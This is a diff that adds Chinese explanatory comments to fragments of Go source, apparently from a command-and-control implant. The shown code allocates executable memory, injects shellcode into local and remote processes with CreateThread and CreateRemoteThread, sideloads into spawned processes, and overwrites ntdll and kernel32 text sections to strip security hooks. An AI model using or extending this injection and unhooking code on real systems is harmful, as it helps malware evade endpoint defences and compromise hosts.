@@ -49,6 +49,7 @@ var (
 	CurrentToken    windows.Token
 )
 
+// VirtualAlloc申请内存，rwxPages决定权限
 func sysAlloc(size int, rwxPages bool) (uintptr, error) {
 	perms := windows.PAGE_EXECUTE_READWRITE
 	if !rwxPages {
@@ -63,6 +64,7 @@ func sysAlloc(size int, rwxPages bool) (uintptr, error) {
 }
 
 // injectTask - Injects shellcode into a process handle
+// CreateRemoteThread
 func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
 	var (
 		err          error
@@ -132,6 +134,7 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windo
 }
 
 // RermoteTask - Injects Task into a processID using remote threads
+// 复制远程句柄，然后进程注入
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
 	var lpTargetHandle windows.Handle
 	err := refresh()
@@ -163,6 +166,7 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 	return nil
 }
 
+// CreateThread
 func LocalTask(data []byte, rwxPages bool) error {
 	var err error
 	if runtime.GOARCH == "amd64" {
@@ -173,10 +177,12 @@ func LocalTask(data []byte, rwxPages bool) error {
 	}
 	size := len(data)
 	addr, _ := sysAlloc(size, rwxPages)
+	// 将任务数据写进申请的内存中
 	for index := 0; index < size; index++ {
 		// super unsafe, but supports arbitrary sizes
 		*(*byte)(unsafe.Pointer(addr + uintptr(index))) = data[index]
 	}
+	// 不允许RWX的话，这里修改权限
 	if !rwxPages {
 		var oldProtect uint32
 		err = windows.VirtualProtect(addr, uintptr(size), windows.PAGE_EXECUTE_READ, &oldProtect)
@@ -424,6 +430,8 @@ func Sideload(procName string, procArgs []string, ppid uint32, data []byte, args
 }
 
 // Util functions
+// 重新加载ntdll和kernel32
+// 覆盖text段
 func refresh() error {
 	// Hotfix for #114
 	// Somehow this fucks up everything on Windows 8.1
